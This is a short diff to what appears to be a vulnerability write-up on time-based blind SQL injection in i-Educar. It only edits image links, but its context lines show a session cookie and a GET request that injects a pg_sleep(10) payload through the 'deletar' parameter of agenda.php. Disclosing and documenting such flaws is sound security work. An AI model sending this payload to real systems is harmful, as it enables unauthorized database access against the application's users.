@@ -38,7 +38,7 @@ Cookie: i_educar_session=oPSWZGZAoaklSkX60cVXos50m3HfqrO8VW8PC0KW
 
 **1. Time delay using pg_sleep(10):**
 
-![Normal request](Time-Based%20Blind%20SQL%20Injection%20in%20i-Educar%20(/image.png)
+![Normal request](image.png)
 
 Normal request
 
@@ -46,7 +46,7 @@ Normal request
 GET /intranet/agenda.php?cod_agenda=2&time=1769548041&deletar=1'%20AND%20(SELECT%201%20FROM%20pg_sleep(10))%20IS%20NULL%20AND%20'a'%3D'a
 ```
 
-![Request with SQL injection Payload](Time-Based%20Blind%20SQL%20Injection%20in%20i-Educar%20(deleta/image%201.png)
+![Normal request](image%201.png)
 
 Request with SQL injection Payload
 
